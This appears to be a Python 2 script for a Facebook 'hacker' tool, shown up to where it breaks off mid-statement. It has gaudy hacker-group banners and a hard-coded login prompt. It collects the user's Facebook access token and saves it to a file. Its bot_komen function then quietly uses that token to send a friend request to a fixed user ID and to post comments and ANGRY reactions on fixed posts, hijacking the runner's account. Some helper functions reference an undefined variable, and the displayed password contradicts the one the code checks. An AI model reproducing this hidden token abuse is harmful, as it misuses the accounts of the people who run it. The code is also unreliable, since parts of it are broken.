#!/usr/bin/python2
#coding=utf-8


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 9; CPH1923 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36')]


def keluar():
	print "\033[0;39m[!] \x1b[0;39mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)


##### LOGO  #####
logo = """ 

\33[38;1mS̳H̳A̳B̳I̳R̳ ̳B̳A̳L̳O̳C̳H̳̳
\33[38;1mP̳A̳K̳ ̳H̳A̳C̳K̳E̳R̳̳ 
\33[38;1mW̳E̳ ̳A̳R̳E̳ ̳A̳N̳O̳N̳Y̳M̳O̳U̳S 
\33[38;1mW̳E̳ ̳A̳R̳E̳ ̳L̳E̳G̳I̳O̳N̳̳ 
\33[38;1m0̳3̳2̳3̳2̳1̳3̳2̳3̳6̳2̳
\33[38;1mLoaded....100%
\033[0;35m[\033[0;92m •• \033[0;35m] Author   : Yubin don
\033[1;34m\033[1;41;33mヅ︻写፨丐יי一一一 ҉ ㄹㅇㄹㅇ \033[0m"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[0;39mPlease Wait \x1b[0;39m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """

\33[31;1m░S░H░A░B░I░R░ ░B░A░L░O░C░H░
\33[31;1m░P░A░K░ ░H░A░C░K░E░R░
\33[31;1m🅿🅰🅺🅸🆂🆃🅰🅽 🆉🅸🅽🅳🅰🅱🅰🅳
\33[31;1m𝗩𝗜𝗦𝗜𝗧 𝗢𝗨𝗥 𝗖𝗛𝗔𝗡𝗡𝗘𝗟
\33[31;1mC͎H͎A͎N͎N͎E͎L͎ ͎N͎A͎M͎E͎=͎ ͎B͎4͎ ͎B͎A͎L͎O͎C͎H͎ ͎M͎4͎ ͎M͎A͎S͎T͎E͎R͎
\33[31;1mLOADING........
\033[0;39m[\033[0;92m •• \033[0;39m] Author   : Yubin don
\033[1;39m\033[1;41;39mヅ︻写፨丐יי一一一 ҉ ㄹㅇㄹ1 \033[0m
\033[0;39m~~~~~~~~~~~~~~~~~~~~~~~~~~~"""
print("\033[0;92mUsername/Password: 786786")
print("\033[0;39m~~~~~~~~~~~~~~~~~~~~~~~~~~~")

CorrectUsername = "Yubin"
CorrectPassword = "Hacker"


loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[0;39m\x1b[0;39mUsername ➣ \x1b[0;39m ")
    if (username == CorrectUsername):
    	password = raw_input("\033[0;39m\x1b[0;39mPassword ➣ \x1b[0;39m ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username
            loop = 'false'
        else:
            print "Wrong Password"
            os.system('python2 a')
    else:
        print "Wrong Username"
        os.system('python2 a')

###### Login ######
def masuk():
	os.system('clear')
	print logo
	print 50* "\033[0;39m─"
	toket = raw_input("\033[0;39m[\033[0;92m> \033[0;39mToken :\033[0;93m ")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		print '\033[0;39m✓\033[0;92m Login Successful'
		menu()
	except KeyError:
		print "\033[0;39m! \033[0;39mToken Invalid !"
		time.sleep(1.7)
		masuk()
		
###### BOT COMMENT #######
def bot_komen():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;39m[!] Token invalid"
		os.system('rm -rf login.txt')
	una = ('1741317224')
	kom = ('𝙷𝚊𝚕𝚕𝚘 𝙰𝚕𝚟𝚒𝚗')
	reac = ('ANGRY')
	post = ('10208284082656658')
	post2 = ('10208284082656658')
	kom2 = ('𝙷𝚊𝚕𝚕𝚘 𝙰𝚕𝚟𝚒𝚗')
	reac2 = ('ANGRY')
	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)
	requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac2+ '&access_token='+ toket)
	menu()
			


def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\033[0;39m[!] Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		masuk()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
		ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
		b = json.loads(ots.text)
		sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[0;91mToken Invalid"
		os.system('python2 a')
		time.sleep(1)
		masuk()
	except requests.exceptions.ConnectionError:
		print"\033[0;39mThere is no internet connection"
		keluar()
	os.system("clear")
	print logo
	print "   \033[0;39
